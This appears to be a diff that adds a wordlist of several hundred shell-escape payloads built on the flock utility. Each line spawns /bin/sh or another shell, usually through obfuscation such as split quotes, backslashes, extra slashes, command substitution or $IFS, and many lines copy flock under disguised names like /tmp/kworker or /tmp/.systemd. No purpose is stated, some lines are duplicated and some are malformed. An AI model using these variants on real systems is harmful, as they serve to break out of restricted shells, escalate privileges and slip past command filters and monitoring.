@@ -1,0 +1,390 @@
+flock -u / /bin/'sh'
+flock -u / /bin/s"h"
+flock -u / /b'in'/sh
+flock -u / /bin//sh
+flock -u / //bin/sh
+flock -u / /b"i"n/sh
+flock -u / /bin/s'h'
+flock -u / "/bin/sh"
+flock -u / '/bin/sh'
+flock -u / /bin/s"h"
+flock -u / /bi'n'/sh
+flock -u / /b"i"n//sh
+flock -u / //b'in'/sh
+flock -u / /b\in/sh
+flock -u / /bin\sh
+flock -u / /bin/s\h
+flock -u / /bin/sh\
+flock -u / /bin/sh/
+flock -u / /bin/sh/.
+flock -u / /bin/.sh
+flock -u / /bi\n/sh
+flock -u / /b\i\n/s\h
+flock -u / /bin/'s''h'
+flock -u / /bin/s""h
+flock -u / /bi"n"/s"h"
+flock -u / /bin/s"h
+flock -u / /b'in'//sh
+flock -u / //bin//sh
+flock -u / /bin////sh
+flock -u / /b'i'n/s'h'
+flock -u / /b""in/sh
+flock -u / /bi'n'/'sh'
+flock -u / /bin/s"h"'
+flock -u / /bin/'s"h"'
+flock -u / /"bin"/"sh"
+flock -u / /b'in//sh
+flock -u / /b"in/"sh"
+flock -u / /bin///"sh"
+flock -u / /bin/./sh
+flock -u / /b''in/sh
+flock -u / /bi''n/sh
+flock -u / /bin/s'h'
+flock -u / /bin/s"h"'
+flock -u / /bin//s'h'
+flock -u / /b"in/sh"
+flock -u / /b'in/sh'
+flock -u / /bi'n/s"h"
+flock -u / /bin/s"h\
+flock -u / /bin\s"h"
+flock -u / /bin\s\h
+flock -u / /b\in\sh
+flock -u / /bin/s\h\
+flock -u / /bi"n"/s'h'
+flock -u / /bin/s"h"\
+flock -u / /bin/s"h"
+flock -u / /bi'n/./sh
+flock -u / /bi"n"/./sh
+flock -u / /bin/.//sh
+flock -u / /bi""n/s""h
+flock -u / /"b""in"/"sh"
+flock --unlock / /bin/sh
+flock -s / /bin/sh
+flock --shared / /bin/sh
+flock -x / /bin/sh
+flock --exclusive / /bin/sh
+flock -n -x / /bin/sh
+flock --nonblock --exclusive / /bin/sh
+flock -n --exclusive / /bin/sh
+flock --exclusive -n / /bin/sh
+flock --shared -n / /bin/sh
+flock --nonblock -s / /bin/sh
+flock -s -n / /bin/sh
+flock /bin/sh -c "echo 1" & flock --exclusive /bin/sh
+flock -E 0 / /bin/sh
+flock --conflict-exit-code=0 / /bin/sh
+flock -w 0 / /bin/sh
+flock --timeout=0 / /bin/sh
+flock -x -w 0 / /bin/sh
+flock --exclusive --timeout=0 / /bin/sh
+flock -s -w 0 / /bin/sh
+flock --shared --timeout=0 / /bin/sh
+flock --verbose -x / /bin/sh
+flock -v -x / /bin/sh
+flock --verbose --exclusive / /bin/sh
+flock --verbose --shared / /bin/sh
+flock --verbose --unlock / /bin/sh
+flock -s --verbose / /bin/sh
+flock -x --verbose / /bin/sh
+flock --shared /bin/bash
+flock --exclusive /bin/sh
+flock --unlock /bin /bin/sh
+flock --unlock /tmp /bin/sh
+flock --unlock /dev/null /bin/sh
+flock --unlock /proc/self /bin/sh
+flock --unlock /etc/passwd /bin/sh
+flock -u /dev/shm /bin/sh
+flock --unlock /run/lock /bin/sh
+flock -x /dev/zero /bin/sh
+flock --exclusive /etc/hosts /bin/sh
+flock --shared /tmp/lockfile /bin/sh
+flock -s /dev/random /bin/sh
+flock --shared /proc/version /bin/sh
+flock --exclusive /run/shm/lock /bin/sh
+flock -s /tmp/.X11-unix /bin/sh
+flock --unlock /var/tmp /bin/sh
+flock --exclusive /var/log /bin/sh
+flock --unlock /var/run /bin/sh
+flock --unlock /lib/modules /bin/sh
+flock -x /home/user /bin/sh
+flock --shared /etc/group /bin/sh
+flock -s /etc/shadow /bin/sh
+flock --unlock $(mktemp) /bin/sh
+flock -u $(mktemp -u) /bin/sh
+flock --unlock /bin/sh -c true; /bin/sh
+flock -x /bin/sh -c ":"; /bin/sh
+flock -s /etc/hostname /bin/sh
+flock -x /etc/issue /bin/sh
+flock -s /etc/motd /bin/sh
+flock --exclusive /proc/cpuinfo /bin/sh
+flock --shared /proc/meminfo /bin/sh
+flock --unlock /bin /bin/sh
+flock --unlock /tmp /bin/sh
+flock --unlock /dev/null /bin/sh
+flock --unlock /proc/self /bin/sh
+flock --unlock /etc/passwd /bin/sh
+flock -u /dev/shm /bin/sh
+flock --unlock /run/lock /bin/sh
+flock -x /dev/zero /bin/sh
+flock --exclusive /etc/hosts /bin/sh
+flock --shared /tmp/lockfile /bin/sh
+flock -s /dev/random /bin/sh
+flock --shared /proc/version /bin/sh
+flock --exclusive /run/shm/lock /bin/sh
+flock -s /tmp/.X11-unix /bin/sh
+flock --unlock /var/tmp /bin/sh
+flock --exclusive /var/log /bin/sh
+flock --unlock /var/run /bin/sh
+flock --unlock /lib/modules /bin/sh
+flock -x /home/user /bin/sh
+flock --shared /etc/group /bin/sh
+flock -s /etc/shadow /bin/sh
+flock --unlock $(mktemp) /bin/sh
+flock -u $(mktemp -u) /bin/sh
+flock --unlock /bin/sh -c true; /bin/sh
+flock -x /bin/sh -c ":"; /bin/sh
+flock -s /etc/hostname /bin/sh
+flock -x /etc/issue /bin/sh
+flock -s /etc/motd /bin/sh
+flock --exclusive /proc/cpuinfo /bin/sh
+flock --shared /proc/meminfo /bin/sh
+flock / /bin/sh
+flock / /bin/bash
+flock / /bin/dash
+flock / /bin/zsh
+flock / /bin/fish
+flock / /usr/bin/sh
+flock / /usr/bin/bash
+flock / /usr/bin/dash
+flock / /usr/bin/zsh
+flock / /usr/bin/fish
+flock / -- /bin/sh
+flock / -- /bin/bash
+flock / -- /bin/dash
+flock / -- /bin/zsh
+flock / -- /bin/fish
+flock -x / /bin/sh
+flock -x / /bin/bash
+flock -x / /bin/dash
+flock -x / /bin/zsh
+flock -x / /bin/fish
+flock -n / /bin/sh
+flock -n / /bin/bash
+flock -xn / /bin/sh
+flock -nx / /bin/bash
+flock -x -n / /bin/sh
+flock -n -x / /bin/bash
+flock --exclusive / /bin/sh
+flock --exclusive / /bin/bash
+flock -- /usr/bin/sh
+flock -xn / -- /bin/sh
+flock /bin /bin/sh
+flock -x /tmp/lockfile /bin/sh
+flock -x /tmp/lockfile -- /bin/sh
+flock --timeout 5 / /bin/sh
+flock --nonblock / /bin/sh
+flock --conflict-exit-code 99 / /bin/sh
+flock -E 1 / /bin/sh
+flock -x /var/lock/lockfile /bin/sh
+flock /dev/shm/lock /bin/sh
+flock /tmp/.X11-lock /bin/sh
+flock /etc/passwd /bin/sh
+flock -x -n /etc/hosts /bin/sh
+flock -- /usr/bin/bash
+flock -x /tmp/lock -- /usr/bin/bash
+flock /tmp/l /bin/bash
+flock -x /tmp/l -- /bin/bash
+flock /dev/null /bin/sh
+flock /tmp/.X0-lock /bin/bash
+flock /etc/shadow /bin/sh
+flock /tmp/lock sh
+flock /tmp/lockfile bash
+flock --nonblock /etc/hosts -- /bin/sh
+flock -- /usr/bin/zsh
+flock -xn /tmp/lock /bin/dash
+flock -x -- /bin/zsh
+flock -x /tmp/f -- /bin/fish
+flock /tmp/lockfile /usr/bin/sh
+flock /tmp/lockfile /usr/bin/dash
+flock -- /usr/bin/fish
+flock -x /tmp/a /usr/bin/bash
+flock -un / /bin/sh
+flock -nu / /bin/sh
+flock -un / /bin/bash
+flock -nu / /bin/bash
+flock -un / /bin/dash
+flock -nu / /bin/dash
+flock -un / /bin/zsh
+flock -nu / /bin/zsh
+flock -un / /bin/fish
+flock -nu / /bin/fish
+flock -nu -- /bin/sh
+flock -un -- /bin/sh
+flock -- -un /bin/sh
+flock -- -nu /bin/sh
+flock -un / -- /bin/sh
+flock -nu / -- /bin/sh
+flock -n -u / /bin/sh
+flock -u -n / /bin/sh
+flock -nu /bin/sh
+flock -un /bin/sh
+flock -un /bin/bash
+flock -nu /bin/bash
+flock -nu /tmp/lock /bin/sh
+flock -un /tmp/lock /bin/sh
+flock -un /tmp/lock -- /bin/sh
+flock -nu /tmp/lock -- /bin/sh
+flock -un / -- /bin/bash
+flock -nu / -- /bin/bash
+flock -un -- /bin/zsh
+flock -nu -- /bin/zsh
+flock -un /tmp/lockfile /bin/dash
+flock -nu /tmp/lockfile /bin/dash
+flock -un /var/lock/x /bin/sh
+flock -nu /var/lock/x /bin/sh
+flock -un /var/lock/x -- /bin/sh
+flock -nu /var/lock/x -- /bin/sh
+flock -un /dev/shm/lock /bin/sh
+flock -nu /dev/shm/lock /bin/sh
+flock -nu /dev/shm/lock -- /bin/sh
+flock -un /dev/shm/lock -- /bin/sh
+flock -un / -- /bin/'sh'
+flock -nu / -- /bin/"sh"
+flock -un / -- /bin/s'h'
+flock -nu / -- /bin/sh$IFS
+flock -un / -- //bin//sh
+flock -nu / -- //bin///sh
+flock -un / -- /bin/s\\h
+flock -nu / -- /bin/sh\
+flock -un / -- $(which sh)
+flock -nu / -- $(which sh)
+flock -un / -- /proc/self/exe
+flock -nu / -- /proc/self/exe
+flock -un / -- /bin/sh -c true
+flock -nu / -- /bin/sh -c true
+flock -un / -- bash -i
+flock -nu / -- bash -i
+flock -un /bin /bin/sh
+flock -nu /bin /bin/sh
+flock -un /tmp /bin/sh
+flock -nu /tmp /bin/sh
+flock -u / /bin/'sh'
+flock -u / /bin/"sh"
+flock -u / /bin/s'h'
+flock -u / /bin/s"h"
+flock -u / /bin//sh
+flock -u / //bin/sh
+flock -u / //bin//sh
+flock -u / /bin///sh
+flock -u / ///bin/sh
+flock -u / /bin////sh
+flock -u / /b'in'/sh
+flock -u / /b"in"/sh
+flock -u / /bi'n'/sh
+flock -u / /bi"n"/sh
+flock -u / /bin/s''h
+flock -u / /bin/s""h
+flock -u / /bin/'s''h'
+flock -u / /bin/"s""h"
+flock -u / /bin//s'h'
+flock -u / //bin/s"h"
+flock -u / ///bin//'sh'
+flock -u / /bin////'sh'
+flock -u / //b'in'//sh
+flock -u / //b"in"//sh
+flock -u / ///bi'n'///sh
+flock -u / ///bi"n"///sh
+flock -u / /bin/s\h
+flock -u / //bin/s\h
+flock -u / /bin///s\h
+flock -u / ///bin////s\h
+flock -u / /b/i/n/sh
+flock -u / /bin/./sh
+flock -u / /bin/../bin/sh
+flock -u / /bin/sh\
+flock -u / "$(echo /bin/sh)"
+flock -u / $(echo /bin/sh)
+flock -u /` echo /bin/sh`
+flock -u / /$(echo bin)/sh
+flock -u / /bin/$(echo sh)
+flock -u / /$(echo bin/sh)
+flock -u / /bi$(echo n)/sh
+flock -u / /bin/s$(echo h)
+flock -u / /b$(echo in)/sh
+flock -u / /bin/$(echo s)h
+flock -u / /bin/sh\0
+flock -u / /bin/sh$IFS
+flock -u / /bin/sh$'\x00'
+flock -u / /bin/$'s''h'
+flock -u / $'/'bin/'s'h'
+flock -u / $'/'bin/sh'
+flock -u / $'//bin//sh'
+flock -u / /bin/$'sh'
+flock -u / /bin/sh$'\n'
+flock -u / $'/bin/sh'
+flock -u / $(printf /bin/sh)
+flock -u /` /bin/echo /bin/sh`
+flock -u / $(cat <<< "/bin/sh")
+flock -u / $(echo -n /bin/; echo sh)
+flock -u / $(echo /bin/sh | tr -d '\n')
+flock -u / "$(printf '/bin/%s' sh)"
+cp /usr/bin/flock /tmp/f && /tmp/f -u / /bin/sh
+cp $(which flock) ./f; ./f -u / /bin/sh
+install /usr/bin/flock /tmp/locky && /tmp/locky -u / /bin/sh
+cp /usr/bin/flock /dev/shm/l; /dev/shm/l -u / /bin/sh
+cp /usr/bin/flock /tmp/.fl; /tmp/.fl -u / /bin/sh
+cp /usr/bin/flock /tmp/runlock; /tmp/runlock -u / /bin/sh
+cp /usr/bin/flock /tmp/ls; /tmp/ls -u / /bin/sh
+cp /usr/bin/flock /tmp/init; /tmp/init -u / /bin/sh
+cp /usr/bin/flock /tmp/fd; /tmp/fd -u / /bin/sh
+cp /usr/bin/flock /tmp/daemon; /tmp/daemon -u / /bin/sh
+cp /usr/bin/flock /tmp/kworker; /tmp/kworker -u / /bin/sh
+cp /usr/bin/flock /tmp/logger; /tmp/logger -u / /bin/sh
+cp /usr/bin/flock /tmp/nologin; /tmp/nologin -u / /bin/sh
+cp /usr/bin/flock /tmp/tty; /tmp/tty -u / /bin/sh
+cp /usr/bin/flock /tmp/tar; /tmp/tar -u / /bin/sh
+cp /usr/bin/flock /tmp/fcron; /tmp/fcron -u / /bin/sh
+cp /usr/bin/flock /tmp/getty; /tmp/getty -u / /bin/sh
+cp /usr/bin/flock /tmp/netcat; /tmp/netcat -u / /bin/sh
+cp /usr/bin/flock /tmp/awk; /tmp/awk -u / /bin/sh
+cp /usr/bin/flock /tmp/python; /tmp/python -u / /bin/sh
+cp /usr/bin/flock /tmp/cronjob; /tmp/cronjob -u / /bin/sh
+cp /usr/bin/flock /tmp/.hidden; /tmp/.hidden -u / /bin/sh
+cp /usr/bin/flock /tmp/bashful; /tmp/bashful -u / /bin/sh
+cp /usr/bin/flock /tmp/snap; /tmp/snap -u / /bin/sh
+cp /usr/bin/flock /tmp/nginx; /tmp/nginx -u / /bin/sh
+cp /usr/bin/flock /tmp/syslog; /tmp/syslog -u / /bin/sh
+cp /usr/bin/flock /tmp/journal; /tmp/journal -u / /bin/sh
+cp /usr/bin/flock /tmp/initd; /tmp/initd -u / /bin/sh
+cp /usr/bin/flock /tmp/mysqld; /tmp/mysqld -u / /bin/sh
+cp /usr/bin/flock /tmp/httpd; /tmp/httpd -u / /bin/sh
+cp /usr/bin/flock /tmp/x && /tmp/x -u / /bin/sh
+cp /usr/bin/flock /tmp/_flock && /tmp/_flock -u / /bin/sh
+cp /usr/bin/flock /tmp/locktool && /tmp/locktool -u / /bin/sh
+cp /usr/bin/flock /tmp/busybox && /tmp/busybox -u / /bin/sh
+cp /usr/bin/flock /tmp/.systemd && /tmp/.systemd -u / /bin/sh
+cp /usr/bin/flock /tmp/.dockerd && /tmp/.dockerd -u / /bin/sh
+cp /usr/bin/flock /tmp/dnsmasq && /tmp/dnsmasq -u / /bin/sh
+cp /usr/bin/flock /tmp/mountd && /tmp/mountd -u / /bin/sh
+cp /usr/bin/flock /tmp/binfmt_misc && /tmp/binfmt_misc -u / /bin/sh
+cp /usr/bin/flock /tmp/u && /tmp/u -u / /bin/sh
+cp /usr/bin/flock /tmp/shinit && /tmp/shinit -u / /bin/sh
+cp /usr/bin/flock /tmp/sysctl && /tmp/sysctl -u / /bin/sh
+cp /usr/bin/flock /tmp/locky.sh && /tmp/locky.sh -u / /bin/sh
+cp /usr/bin/flock /tmp/serv && /tmp/serv -u / /bin/sh
+cp /usr/bin/flock /tmp/pid1 && /tmp/pid1 -u / /bin/sh
+cp /usr/bin/flock /tmp/conf && /tmp/conf -u / /bin/sh
+cp /usr/bin/flock /tmp/resolver && /tmp/resolver -u / /bin/sh
+cp /usr/bin/flock /tmp/wrapper && /tmp/wrapper -u / /bin/sh
+cp /usr/bin/flock /tmp/update && /tmp/update -u / /bin/sh
+cp /usr/bin/flock /tmp/startup && /tmp/startup -u / /bin/sh
+cp /usr/bin/flock /tmp/shellrunner && /tmp/shellrunner -u / /bin/sh
+cp /usr/bin/flock /tmp/binx && /tmp/binx -u / /bin/sh
+cp /usr/bin/flock /tmp/shbin && /tmp/shbin -u / /bin/sh
+cp /usr/bin/flock /tmp/tmpx && /tmp/tmpx -u / /bin/sh
+cp /usr/bin/flock /tmp/tasker && /tmp/tasker -u / /bin/sh
+cp /usr/bin/flock /tmp/fsync && /tmp/fsync -u / /bin/sh
+cp /usr/bin/flock /tmp/proxy && /tmp/proxy -u / /bin/sh
+cp /usr/bin/flock /tmp/syncd && /tmp/syncd -u / /bin/sh
+cp /usr/bin/flock /tmp/.bashrc && /tmp/.bashrc -u / /bin/sh
+cp /usr/bin/flock /tmp/jobctl && /tmp/jobctl -u / /bin/sh
